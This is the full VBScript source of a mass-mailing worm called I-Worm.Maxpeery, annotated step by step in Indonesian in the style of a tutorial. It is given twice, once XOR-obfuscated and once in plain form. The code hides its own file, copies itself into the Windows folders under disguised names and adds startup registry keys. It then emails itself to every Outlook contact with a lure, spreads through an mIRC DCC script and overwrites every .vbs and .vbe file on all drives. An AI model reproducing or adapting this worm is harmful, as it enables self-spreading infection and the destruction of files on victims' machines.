   'I-Worm.Maxpeery
   'by Spidey [SECTOR-S]
   'origin : SECTOR-S Underground Team

   On Error Resume Next
   'Jalan terus.......

   Dim FS0, W5, W1N, SY5
   'Mendeklarasikan variable.
   'Sebenarnya variable gak pake di deklarasi juga ga papa...
   'Kenapa saya nekat mendeklarasikan variable ?
   'Biar kelihatan kayak programmer prof...

   Set FS0 = CreateObject(SECTORS("Brcxaex v?Wx}tBhbet|^s{tre"))
   'IMHO, bagian ini paling penting dalam pembuatan worm.
   'Karena dengan ini worm bisa mendapatkan banyak hal seperti, ukuran celana kamu, ukuran cd kamu bahkan sampai ukuran birahi kamu, hehehe kidding :), untuk lebih jelasnya baca terus artikel ini dan temukan sendiri apa yang bisa di dapatkan dengan ini.

   Set W5 = CreateObject(SECTORS("FBrcxae?Byt}}"))
   'Membuat shell object Wscript

   Set W1N = FS0.GetSpecialFolder(0)
   'Simpan path %windir% di variable W1N

   Set SY5 = FS0.GetSpecialFolder(1)
   'Simpan path %systemdir% di variable SY5

   P1C = SECTORS("MRycxbex pNP`dx}tcp?{av?gsb")
   'Variable P1C = nama file Christina_Aquilera.jpg.vbs

   G5W = SECTORS("Mvbf""#?tit?gsb")
   'Variable G5W = nama file gsw332.exe.vbs

   Spidey = RR(SECTORS("YZRDMB~wefpctM\xrc~b~weMFx u~fb1Brcxae1Y~beMBteex vbMEx|t~de"))
   'Variable Spidey berisi value dari setting time out dari WSH (Windows Scripting Host)

   If Spidey <= 1 Then
   'Apakah value time out WSH lebih besar atau sama dengan 1 ?

     RWT SECTORS("YZRDMB~wefpctM\xrc~b~weMFx u~fb1Brcxae1Y~beMBteex vbMEx|t~de"),0,SECTORS("CTVNUF^CU")
   'Jika ya, ubah value time out menjadi 0

   End If
   'Akhir pengecekan value time out WSH

   Set PTHW0RM = FS0.GetFile(Wscript.ScriptFullName)
   'Variable PTHW0RM menyimpan path dari worm ini sendiri.
   'Dengan "Wscript.ScriptFullName" maka kamu bisa mendapatkan path penuh (FULL PATH) dari worm, sedangkan jika yang dipakai adalah "Wscript.ScriptName", maka yang didapatkan hanyalah nama filenya saja.

   if PTHW0RM.Attributes <> 7 Then
   'Cek nilai atribut worm ini.
   'Apakah nilai atribunya tidak sama dengan 7 ?

   PTHW0RM.Attributes = 7
   'Jika jawabanya iya, maka ubah nilai atributnya jadi 7 (Read-only + Hidden + System)

   End If
   'Akhir pengecekan nilai atribut file.

   If W1N & P1C <> P1C Then
   'Apakah di %windir% sudah ada file degan nama yang dimuat oleh variable P1C ?

     FS0.CopyFile PTHW0RM, W1N & P1C
   'Jika tidak, maka instal worm ke %windir%

     RW SECTORS("YZ]\MB~wefpctM\xrc~b~weMFx u~fbMRdcct eGtcbx~ MCd ^ rtMPGARR"), W1N & PIC
   'Sekalian buat payload startup di registri

   End If
   'Ga perlu dijelasin, ok...

   If SY5 & G5W <> G5W Then
   'Apakah di %systemdir% sudah ada file dengan nama yang dimuat oleh variable G5W ?

     FS0.CopyFile PTHW0RM, SY5 & G5W
   'Kalau tidak juga, maka instal worm ke %systemdir% juga

     RW SECTORS("YZ]\MB~wefpctM\xrc~b~weMFx u~fbMRdcct eGtcbx~ MCd MrrPaa"), SY5 & G5W
   'Jangan lupa payload-nya

   End If
   '...

   If FS0.FolderExists(SECTORS("r+Mac~vcp|1wx}tbMfx cpc")) Then
   'Sekarang kita cek C:\Program Files
   'Kalau di Program Files ada folder dengan nama winrar maka..

     If Lcase(WScript.ScriptName) = SECTORS("rycxbex pNp`dx}tcp?{av?gsb") Then
   'Apakah worm yang sedang aktif nama filenya "christina_aquilera.jpg.vbs"

       W5.Run SECTORS("fx cpc1p1<abtre~cb1Rycxbex pNP`dx}tcp?cpc1") & Wscript.ScriptName, vbHide
   'Jika ya, maka jalankan perintah "winrar a -psectors Christina_Aquilera.rar nama_file_worm"
   'Hasilnya kita mendapatkan file Christina_Aquilera.rar yang terpassword, dengan password "sectors" tanpa kutip.

     Else
   'Tapi, jika worm yang aktif nama filenya bukan "christina_aquilera.jpg.vbs" maka...

     If Lcase(WScript.ScriptName) = SECTORS("vbf""#?tit?gsb") Then
   'Kalau benar worm yang aktif nama filenya adalah "gsw332.exe.vbs", maka

       W5.Run SECTORS("fx cpc1p1<abtre~cb1vbf""#?cpc1") & Wscript.ScriptName, vbHide
   'Jalankan perintah "winrar a -psectors gsw332.rar nama_file_worm"
   'Dan kemudian kita mendapatkan file gsw332.rar yang terpassword juga.
   'Sayangnya kalau worm yang aktif nama filenya bukan "christina_aquilera.jpg.vbs" atau "gsw332.exe.vbs", maka perintah memasukan worm kedalam file .rar gagal total.

     End If
     End If
   End If
   'Akhir dari If, If diatas

   'Berikut ini adalah script mass mailer yang akan membantu penyebarkan worm menggunakan M$ Outlook
   Set M41L = FS0.CreateTextFile(SECTORS("D utcvc~d u?xr~"),1)
   'Variable M41L bertugas menciptakan file "Underground.ico"

   M41L.WriteLine SECTORS("Bte1^de}~~zPaa1,1Rctpet^s{tre93^de}~~z?Paa}xrpex~ 38") & vbCrLf & _
   SECTORS("Xw1_~e1^de}~~zPaa1,1331Eyt ") & vbCrLf & _
   SECTORS("W~c1Tpry1R~ epreBfxery1X 1^de}~~zPaa?Vte_p|tBaprt93\PAX38?Puuctbb]xbeb") & vbCrLf & _
   SECTORS("W~c1DbtcVc~da1,1 1E~1R~ epreBfxery?PuuctbbT ecxtb?R~d e") & vbCrLf & _
   SECTORS("Bte1^de}~~zT|px}1,1^de}~~zPaa?RctpetXet|9!8") & vbCrLf & _
   SECTORS("^de}~~zT|px}?Ctrxaxt eb?Puu1R~ epreBfxery?PuuctbbT ecxtb9DbtcVc~da8") & vbCrLf & _
   SECTORS("^de}~~zT|px}?Bds{tre1,13E~}~ v1u~ v???3") & vbCrLf & _
   SECTORS("^de}~~zT|px}?S~uh1,13Zt pap1upcx1ud}d1yxudazd1btatcex1x x1.=1zt pap1vp1pup1atcdspyp 1hp v1stcpcex1.3171gsRc]w1713E~}~ v1u~ v1rpcxx 1pzd1ztc{pp 3171gsRc]w171gsRc]w171AP$$") & vbCrLf & _
   SECTORS("^de}~~zT|px}?Peepry|t eb?Puu1PEERY") & vbCrLf & _
   SECTORS("^de}~~zT|px}?Ut}tetPwetcBds|xe1,1Ecdt") & vbCrLf & _
   SECTORS("^de}~~zT|px}?Bt u") & vbCrLf & _
   SECTORS("_tie") & vbCrLf & _
   SECTORS("_tie") & vbCrLf & _
   SECTORS("T u1Xw")
   'String diatas merupakan isi sebenarnya dari "Underground.ico", kalau ga percaya silahkan buka "Underground.ico" mengunakan notepad/teks editor kamu !

   M41L.Close
   'Tutup file "Underground.ico"

   'Dibawah ini adalah perintah pengecekan file mana yang akan disebarkan pake Outlook dan mIRC, file dengan extensi .rar atau .vbs
   If FS0.FileExists(W1N & SECTORS("MRycxbex pNP`dx}tcp?cpc")) Then
   'Jika pada directory %windir% sudah ada file "Christina_Aquilera.rar" maka...

     ATTCH = W1N & SECTORS("MRycxbex pNP`dx}tcp?cpc")
   'Variable ATTCH menyimpan "%windir%\Christina_Aquilera.rar"

     PA55 = SECTORS("Apbbf~cu1peepry|t e hp1,1btre~cb")
   'Variable PA55 menyimpan string "Password attachmentnya = sectors", dimana string ini, nanti akan menjadi pelengkap pesan yang disebarkan ke email dan mIRC

   Else
   'Jika pada directory %windir% tidak terdapat file "Christina_Aquilera.rar" maka...

   If FS0.FileExists(W1N & SECTORS("Mvbf""#?cpc")) Then
   'Coba cek di %windir% apa ada file "gsw332.rar" jika ya, maka

     ATTCH = W1N & SECTORS("Mvbf""#?cpc")
   'Simpan path "%windir%\gsw332.rar" pada variable ATTCH

     PA55 = SECTORS("Apbbf~cu1peepry|t e hp1,1btre~cb")
   'Dan variable PA55 sama dengan diatas

   Else
   'Jika pada directory %windir% juga tidak terdapat file "gsw332.rar" maka...

     ATTCH = WScript.ScriptFullName
   'Isi variable ATTCH dengan path worm yang sedang aktif

     PA55 = ""
   'Variable PA55 dikosongkan

   End If
   End If
   'Akhir dari pengecekan diatas

   If FS0.FolderExists(SECTORS("r+M|xcr")) Then
   'Cek folder di root c:, apa ada folder "mirc"

     Set M1RC = FS0.CreateTextFile(SECTORS("r+M|xcrMbrcxae?x x"),1)
   'Maka set variable MIRC sebagai pencipata file "script.ini" di "c:\mirc"

     M1RC.WriteLine SECTORS("JbrcxaeL") & vbCrLf & vbCrLf & _
     SECTORS(" $,1^ 1 +[^X_+2+j") & vbCrLf & _
     SECTORS(" ',1>xw1915 xrz1,,15|t181j1yp}e1l") & vbCrLf & _
     SECTORS(" &,1>|bv15") & PA55 & vbCrLf & _
     SECTORS(" ),>urr1bt u1<r15 xrz1") & ATTCH & vbCrLf & _
     SECTORS(" (,1l")
     M1RC.Close
   'Langsung aja, string-string diatas akan dituliskan pada "script.ini"

   End If
   'Akhir pengecekan folder "mirc" di root c:

   M4IL = FS0.OpenTextFile(SECTORS("D utcvc~d u?xr~")).ReadAll
   'Variable M4IL berisi semua string "Underground.ico"

   execute M4IL
   'Eksekusi semua string yang ada pada variable M4IL

   MsgBox SECTORS("X<F~c|?\piattch") & vbCrLf & vbCrLf & SECTORS("sh1Baxuth1JBTRE^C<BL") & vbCrLf & SECTORS("X u~ tbxp") & vbCrLf & SECTORS("DC]1+1yeea+>>btre~cb?gkt?r~|"), vbCritical, SECTORS("X<F~c|?\piattch")
   'Pesan khusus untuk user

   'Script berikut bertugas mencari file .vbs dan .vbe diseluruh drive
   Infected()
   'Memanggil Sub Infected untuk menciptakan file wini.ico

   INF3C = FS0.OpenTextFile(SECTORS("fx x?xr~")).ReadAll
   'Isi variable INF3C dengan semua script yang ada di wini.ico

   execute INF3C
   'Eksekusi semua script wini.ico

   Set Drives = FS0.Drives
   'Deklarasikan Variable Drives sebagai object drive

   For Each Drive in Drives
   'Cek semua drive

   If Drive.IsReady Then
   'Cek status drive True atau False

   Infect Drive & "\"
   'Kalau jawabanya True maka panggil Sub Infect, yang mana scriptnya bisa kamu temukan di "wini.ico"

   End If
   'Akhiri pengecekan drive

   Next
   'Lanjut

   Sub Infected()
   'Jika sub ini dipanggil maka file "wini.ico" akan tercipta.

   Set WIft = FS0.CreateTextFile(SECTORS("fx x?xr~"),1)
   'Seperti biasa, CreateTextFile = buat file text

   WIft.WriteLine SECTORS("6X<F~c|?\piattch1btpcryx v1w~c1wx}t????????") & vbCrLf & _
   SECTORS("Bds1X wtre9Wx}t hp8") & vbCrLf & _
   SECTORS("^ 1Tcc~c1Ctbd|t1_tie") & vbCrLf & _
   SECTORS("Bte1VW~}1,1WB!?VteW~}utc9Wx}t hp8") & vbCrLf & _
   SECTORS("W~c1Tpry1Wx}t1X 1VW~}?Wx}tb") & vbCrLf & _
   SECTORS("tie1,1WB!?VteTiet bx~ _p|t9Wx}t?Apey8") & vbCrLf & _
   SECTORS("xw19tie1,13gsb381~c19tie1,13gst381eyt ") & vbCrLf & _
   SECTORS("xbGSB9Wx}t?Apey8") & vbCrLf & _
   SECTORS("T u1Xw") & vbCrLf & _
   SECTORS("_tie") & vbCrLf & _
   SECTORS("W~c1Tpry1W~}1x 1VW~}?BdsW~}utcb") & vbCrLf & _
   SECTORS("X wtre9W~}?Apey8") & vbCrLf & _
   SECTORS("_tie") & vbCrLf & _
   SECTORS("T u1Bds")
   WIft.Close
   'String diatas merupakan isi dari "wini.ico",

   End Sub
   'Akhir dari Sub Infected

   Sub isVBS(Filenya)
   'Sub ini akan dipanggil jika ditemukan file .vbs atau .vbe di dalam folder dan sub folder

   Set TFile = FS0.GetFile(Filenya)
   'Variable TFile berisi path file .vbs atau .vbe yang menjadi target overwrite

   FS0.CopyFile PTHW0RM, TFile
   'Copy script worm pada file target

   End Sub
   'Ending Sub isVBS

   FS0.DeleteFile(SECTORS("D utcvc~d u?xr~"))
   FS0.DeleteFile(SECTORS("fx x?xr~"))
   'Jika tugas sudah terlaksana semua maka hapus file "Underground.ico" dan "wini.ico"

   Function RW(SECTOR, S)
   W5.RegWrite SECTOR, S
   End Function
   'Fungsi tulis registri

   Function RWT(SECTOR, S, SUT)
   W5.RegWrite SECTOR, S, SUT
   End Function
   'Fungsi tulis registri + tipe-nya

   Function RR(SECTORS)
   W5.RegRead SECTORS
   End Function
   'Fungsi baca registri

   Function SECTORS(Team)
   For i = 1 To Len(Team)
   INDO = Chr(Asc(Mid(Team, i, 1)) Xor Len("Spidey [SECTOR-S]"))
   Underground = Underground & INDO
   SECTORS = Underground
   Next
   End Function

   ' Original Source Code

   'I-Worm.Maxpeery
   'by Spidey [SECTOR-S]
   'origin : SECTOR-S Underground Team

   On Error Resume Next
   'Jalan terus.......

   Dim FS0, W5, W1N, SY5
   'Mendeklarasikan variable.
   'Sebenarnya variable gak pake di deklarasi juga ga papa...
   'Kenapa saya nekat mendeklarasikan variable ?
   'Biar kelihatan kayak programmer prof...

   Set FS0 = CreateObject("Scripting.FileSystemObject")
   'IMHO, bagian ini paling penting dalam pembuatan worm.
   'Karena dengan ini worm bisa mendapatkan banyak hal seperti, ukuran celana kamu, ukuran cd kamu bahkan sampai ukuran birahi kamu, hehehe kidding :), untuk lebih jelasnya baca terus artikel ini dan temukan sendiri apa yang bisa di dapatkan dengan ini.

   Set W5 = CreateObject("WScript.Shell")
   'Membuat shell object Wscript

   Set W1N = FS0.GetSpecialFolder(0)
   'Simpan path %windir% di variable W1N

   Set SY5 = FS0.GetSpecialFolder(1)
   'Simpan path %systemdir% di variable SY5

   P1C = "\Christina_Aquilera.jpg.vbs"
   'Variable P1C = nama file Christina_Aquilera.jpg.vbs

   G5W = "\gsw32.exe.vbs"
   'Variable G5W = nama file gsw332.exe.vbs

   Spidey = RR("HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout")
   'Variable Spidey berisi value dari setting time out dari WSH (Windows Scripting Host)

   If Spidey <= 1 Then
   'Apakah value time out WSH lebih besar atau sama dengan 1 ?

     RWT "HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"REG_DWORD"
   'Jika ya, ubah value time out menjadi 0

   End If
   'Akhir pengecekan value time out WSH

   Set PTHW0RM = FS0.GetFile(Wscript.ScriptFullName)
   'Variable PTHW0RM menyimpan path dari worm ini sendiri.
   'Dengan "Wscript.ScriptFullName" maka kamu bisa mendapatkan path penuh (FULL PATH) dari worm, sedangkan jika yang dipakai adalah "Wscript.ScriptName", maka yang didapatkan hanyalah nama filenya saja.

   if PTHW0RM.Attributes <> 7 Then
   'Cek nilai atribut worm ini.
   'Apakah nilai atribunya tidak sama dengan 7 ?

   PTHW0RM.Attributes = 7
   'Jika jawabanya iya, maka ubah nilai atributnya jadi 7 (Read-only + Hidden + System)

   End If
   'Akhir pengecekan nilai atribut file.

   If W1N & P1C <> P1C Then
   'Apakah di %windir% sudah ada file degan nama yang dimuat oleh variable P1C ?

     FS0.CopyFile PTHW0RM, W1N & P1C
   'Jika tidak, maka instal worm ke %windir%

     RW "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\AVPCC", W1N & PIC
   'Sekalian buat payload startup di registri

   End If
   'Ga perlu dijelasin, ok...

   If SY5 & G5W <> G5W Then
   'Apakah di %systemdir% sudah ada file dengan nama yang dimuat oleh variable G5W ?

     FS0.CopyFile PTHW0RM, SY5 & G5W
   'Kalau tidak juga, maka instal worm ke %systemdir% juga

     RW "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ccApp", SY5 & G5W
   'Jangan lupa payload-nya

   End If
   '...

   If FS0.FolderExists("c:\program files\winrar") Then
   'Sekarang kita cek C:\Program Files
   'Kalau di Program Files ada folder dengan nama winrar maka..

     If Lcase(WScript.ScriptName) = "christina_aquilera.jpg.vbs" Then
   'Apakah worm yang sedang aktif nama filenya "christina_aquilera.jpg.vbs"

       W5.Run "winrar a -psectors Christina_Aquilera.rar " & Wscript.ScriptName, vbHide
   'Jika ya, maka jalankan perintah "winrar a -psectors Christina_Aquilera.rar nama_file_worm"
   'Hasilnya kita mendapatkan file Christina_Aquilera.rar yang terpassword, dengan password "sectors" tanpa kutip.

     Else
   'Tapi, jika worm yang aktif nama filenya bukan "christina_aquilera.jpg.vbs" maka...

     If Lcase(WScript.ScriptName) = "gsw32.exe.vbs" Then
   'Kalau benar worm yang aktif nama filenya adalah "gsw332.exe.vbs", maka

       W5.Run "winrar a -psectors gsw32.rar " & Wscript.ScriptName, vbHide
   'Jalankan perintah "winrar a -psectors gsw332.rar nama_file_worm"
   'Dan kemudian kita mendapatkan file gsw332.rar yang terpassword juga.
   'Sayangnya kalau worm yang aktif nama filenya bukan "christina_aquilera.jpg.vbs" atau "gsw332.exe.vbs", maka perintah memasukan worm kedalam file .rar gagal total.

     End If
     End If
   End If
   'Akhir dari If, If diatas

   'Berikut ini adalah script mass mailer yang akan membantu penyebarkan worm menggunakan M$ Outlook
   Set M41L = FS0.CreateTextFile("Underground.ico",1)
   'Variable M41L bertugas menciptakan file "Underground.ico"

   M41L.WriteLine "Set OutlookApp = CreateObject("Outlook.Application")" & vbCrLf & _
   "If Not OutlookApp = "" Then" & vbCrLf & _
   "For Each ContactSwitch In OutlookApp.GetNameSpace("MAPI").AddressLists" & vbCrLf & _
   "For UserGroup = 1 To ContactSwitch.AddressEntries.Count" & vbCrLf & _
   "Set OutlookEmail = OutlookApp.CreateItem(0)" & vbCrLf & _
   "OutlookEmail.Recipients.Add ContactSwitch.AddressEntries(UserGroup)" & vbCrLf & _
   "OutlookEmail.Subject = "Tolong dong..."" & vbCrLf & _
   "OutlookEmail.Body = "Kenapa dari dulu hidupku seperti ini ?, kenapa ga ada perubahan yang berarti ?" & vbCrLf & "Tolong dong cariin aku kerjaan" & vbCrLf & vbCrLf & PA55" & vbCrLf & _
   "OutlookEmail.Attachments.Add ATTCH" & vbCrLf & _
   "OutlookEmail.DeleteAfterSubmit = True" & vbCrLf & _
   "OutlookEmail.Send" & vbCrLf & _
   "Next" & vbCrLf & _
   "Next" & vbCrLf & _
   "End If"
   'String diatas merupakan isi sebenarnya dari "Underground.ico", kalau ga percaya silahkan buka "Underground.ico" mengunakan notepad/teks editor kamu !

   M41L.Close
   'Tutup file "Underground.ico"

   'Dibawah ini adalah perintah pengecekan file mana yang akan disebarkan pake Outlook dan mIRC, file dengan extensi .rar atau .vbs
   If FS0.FileExists(W1N & "\Christina_Aquilera.rar") Then
   'Jika pada directory %windir% sudah ada file "Christina_Aquilera.rar" maka...

     ATTCH = W1N & "\Christina_Aquilera.rar"
   'Variable ATTCH menyimpan "%windir%\Christina_Aquilera.rar"

     PA55 = "Password attachmentnya = sectors"
   'Variable PA55 menyimpan string "Password attachmentnya = sectors", dimana string ini, nanti akan menjadi pelengkap pesan yang disebarkan ke email dan mIRC

   Else
   'Jika pada directory %windir% tidak terdapat file "Christina_Aquilera.rar" maka...

   If FS0.FileExists(W1N & "\gsw32.exe.vbs") Then
   'Coba cek di %windir% apa ada file "gsw332.rar" jika ya, maka

     ATTCH = W1N & "\gsw32.rar"
   'Simpan path "%windir%\gsw332.rar" pada variable ATTCH

     PA55 = "Password attachmentnya = sectors"
   'Dan variable PA55 sama dengan diatas

   Else
   'Jika pada directory %windir% juga tidak terdapat file "gsw332.rar" maka...

     ATTCH = WScript.ScriptFullName
   'Isi variable ATTCH dengan path worm yang sedang aktif

     PA55 = ""
   'Variable PA55 dikosongkan

   End If
   End If
   'Akhir dari pengecekan diatas

   If FS0.FolderExists("c:\mirc") Then
   'Cek folder di root c:, apa ada folder "mirc"

     Set M1RC = FS0.CreateTextFile("c:\mirc\script.ini",1)
   'Maka set variable MIRC sebagai pencipata file "script.ini" di "c:\mirc"

     M1RC.WriteLine "[script]" & vbCrLf & vbCrLf & _
     "n5= On 1:JOIN:#:{" & vbCrLf & _
     "n6= /if ( $nick == $me ) { halt }" & vbCrLf & _
     "n7= /msg $" & PA55 & vbCrLf & _
     "n8=/dcc send -c $nick " & ATTCH & vbCrLf & _
     "n9= }"
     M1RC.Close
   'Langsung aja, string-string diatas akan dituliskan pada "script.ini"

   End If
   'Akhir pengecekan folder "mirc" di root c:

   M4IL = FS0.OpenTextFile("Underground.ico").ReadAll
   'Variable M4IL berisi semua string "Underground.ico"

   execute M4IL
   'Eksekusi semua string yang ada pada variable M4IL

   MsgBox "I-Worm.Maxpeery" & vbCrLf & vbCrLf & "by Spidey [SECTOR-S]" & vbCrLf & "Indonesia" & vbCrLf & "URL : http://sectors.vze.com", vbCritical, "I-Worm.Maxpeery"
   'Pesan khusus untuk user

   'Script berikut bertugas mencari file .vbs dan .vbe diseluruh drive
   Infected()
   'Memanggil Sub Infected untuk menciptakan file wini.ico

   INF3C = FS0.OpenTextFile("wini.ico").ReadAll
   'Isi variable INF3C dengan semua script yang ada di wini.ico

   execute INF3C
   'Eksekusi semua script wini.ico

   Set Drives = FS0.Drives
   'Deklarasikan Variable Drives sebagai object drive

   For Each Drive in Drives
   'Cek semua drive

   If Drive.IsReady Then
   'Cek status drive True atau False

   Infect Drive & "\"
   'Kalau jawabanya True maka panggil Sub Infect, yang mana scriptnya bisa kamu temukan di "wini.ico"

   End If
   'Akhiri pengecekan drive

   Next
   'Lanjut

   Sub Infected()
   'Jika sub ini dipanggil maka file "wini.ico" akan tercipta.

   Set WIft = FS0.CreateTextFile("wini.ico",1)
   'Seperti biasa, CreateTextFile = buat file text

   WIft.WriteLine "'I-Worm.Maxpeery searching for file........" & vbCrLf & _
   "Sub Infect(Filenya)" & vbCrLf & _
   "On Error Resume Next" & vbCrLf & _
   "Set GFol = FS0.GetFolder(Filenya)" & vbCrLf & _
   "For Each File In GFol.Files" & vbCrLf & _
   "ext = FS0.GetExtensionName(File.Path)" & vbCrLf & _
   "if (ext = "vbs") or (ext = "vbe") then" & vbCrLf & _
   "isVBS(File.Path)" & vbCrLf & _
   "End If" & vbCrLf & _
   "Next" & vbCrLf & _
   "For Each Fol in GFol.SubFolders" & vbCrLf & _
   "Infect(Fol.Path)" & vbCrLf & _
   "Next" & vbCrLf & _
   "End Sub"
   WIft.Close
   'String diatas merupakan isi dari "wini.ico",

   End Sub
   'Akhir dari Sub Infected

   Sub isVBS(Filenya)
   'Sub ini akan dipanggil jika ditemukan file .vbs atau .vbe di dalam folder dan sub folder

   Set TFile = FS0.GetFile(Filenya)
   'Variable TFile berisi path file .vbs atau .vbe yang menjadi target overwrite

   FS0.CopyFile PTHW0RM, TFile
   'Copy script worm pada file target

   End Sub
   'Ending Sub isVBS

   FS0.DeleteFile("Underground.ico")
   FS0.DeleteFile("wini.ico")
   'Jika tugas sudah terlaksana semua maka hapus file "Underground.ico" dan "wini.ico"

   Function RW(SECTOR, S)
   W5.RegWrite SECTOR, S
   End Function
   'Fungsi tulis registri

   Function RWT(SECTOR, S, SUT)
   W5.RegWrite SECTOR, S, SUT
   End Function
   'Fungsi tulis registri + tipe-nya

   Function RR(SECTORS)
   W5.RegRead SECTORS
   End Function
   'Fungsi baca registri

   Function SECTORS(Team)
   For i = 1 To Len(Team)
   INDO = Chr(Asc(Mid(Team, i, 1)) Xor Len("Spidey [SECTOR-S]"))
   Underground = Underground & INDO
   SECTORS = Underground
   Next
   End Function
